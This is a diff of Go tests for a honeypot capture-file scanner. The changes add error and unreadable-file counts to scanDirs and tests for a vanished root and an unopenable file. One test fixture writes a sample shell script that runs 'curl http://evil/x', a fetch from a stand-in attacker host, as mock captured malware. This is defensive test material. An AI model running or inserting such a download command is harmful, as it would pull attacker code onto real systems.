@@ -29,7 +29,10 @@ func TestScanDirsClassifiesAndSourcesAFile(t *testing.T) {
 	hash := "0123456789abcdef0123456789abcdef01234567"
 	writeHashNamedFile(t, dir, hash, []byte("#!/bin/sh\ncurl http://evil/x\n"))
 
-	files, paths := scanDirs([]string{dir})
+	files, paths, stats := scanDirs([]string{dir})
+	if stats.WalkErrs != 0 || stats.Unreadable != 0 {
+		t.Fatalf("clean scan must report zero errors, got %+v", stats)
+	}
 	if len(files) != 1 {
 		t.Fatalf("expected 1 file, got %d: %+v", len(files), files)
 	}
@@ -61,7 +64,7 @@ func TestScanDirsCarriesMtimeUTC(t *testing.T) {
 	hash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
 	writeHashNamedFile(t, dir, hash, []byte("sample"))
 
-	files, _ := scanDirs([]string{dir})
+	files, _, _ := scanDirs([]string{dir})
 	if len(files) != 1 {
 		t.Fatalf("expected 1 file, got %d", len(files))
 	}
@@ -80,7 +83,7 @@ func TestScanDirsCarriesSizeCappedPreview(t *testing.T) {
 	big := bytes.Repeat([]byte{'A'}, payloadPreviewCap*4)
 	writeHashNamedFile(t, dir, hash, big)
 
-	files, _ := scanDirs([]string{dir})
+	files, _, _ := scanDirs([]string{dir})
 	if len(files) != 1 {
 		t.Fatalf("expected 1 file, got %d", len(files))
 	}
@@ -99,9 +102,57 @@ func TestScanDirsIgnoresNonHashNamedFiles(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(dir, "not-a-hash.txt"), []byte("x"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	files, _ := scanDirs([]string{dir})
+	files, _, _ := scanDirs([]string{dir})
 	if len(files) != 0 {
 		t.Fatalf("expected no files, got %+v", files)
+	}
+}
+
+// TestScanDirsCountsWalkErrorsOnVanishedRoot covers #2343's count half: a
+// capture directory that existed at startup but vanished before a later
+// cycle (unmounted volume, deleted tree) delivers its failure as walkErr on
+// the root entry. main()'s startup filter never re-runs, so scanDirs is the
+// only place that can notice -- and the count reaching runScan's summary is
+// what separates "empty because clean" from "empty because unreadable".
+func TestScanDirsCountsWalkErrorsOnVanishedRoot(t *testing.T) {
+	missing := filepath.Join(t.TempDir(), "gone")
+	files, _, stats := scanDirs([]string{missing})
+	if len(files) != 0 {
+		t.Fatalf("expected no files from a missing root, got %+v", files)
+	}
+	if stats.WalkErrs == 0 {
+		t.Fatal("a vanished root must be counted as a walk error")
+	}
+}
+
+// TestScanDirsCountsUnopenableFiles covers #2343's second swallow: a
+// hash-named regular file that exists but cannot be opened still gets an
+// inventory row (octet-stream, empty preview), and the row used to look
+// identical to a real classification. chmod-0400 blocks reads for
+// unprivileged users only; production grants this worker DAC_READ_SEARCH
+// (compose cap_add), so in a privileged container this specific failure
+// mode genuinely cannot occur and the test steps aside.
+func TestScanDirsCountsUnopenableFiles(t *testing.T) {
+	if os.Geteuid() == 0 {
+		t.Skip("running as root: mode bits cannot make a file unopenable")
+	}
+	dir := t.TempDir()
+	hash := "cccccccccccccccccccccccccccccccccccccccc"
+	path := writeHashNamedFile(t, dir, hash, []byte("locked"))
+	if err := os.Chmod(path, 0o000); err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { os.Chmod(path, 0o644) }) // let t.TempDir's cleanup reap it
+
+	files, _, stats := scanDirs([]string{dir})
+	if len(files) != 1 {
+		t.Fatalf("expected the unopenable file to still produce a row, got %+v", files)
+	}
+	if files[0].MIME != "application/octet-stream" || files[0].Preview != "" {
+		t.Fatalf("unopenable file must carry the degraded default classification, got %+v", files[0])
+	}
+	if stats.Unreadable != 1 {
+		t.Fatalf("stats.Unreadable = %d, want 1", stats.Unreadable)
 	}
 }
 
@@ -115,7 +166,7 @@ func TestScanDirsMergesSameHashAcrossDirectoriesAsCopiesAndSources(t *testing.T)
 	cowrieDir = filepath.Join(cowrieDir, "cowrie-downloads")
 	writeHashNamedFile(t, cowrieDir, hash, []byte("MZ"))
 
-	files, _ := scanDirs([]string{dionaeaDir, cowrieDir})
+	files, _, _ := scanDirs([]string{dionaeaDir, cowrieDir})
 	if len(files) != 1 {
 		t.Fatalf("expected 1 merged file, got %d: %+v", len(files), files)
 	}
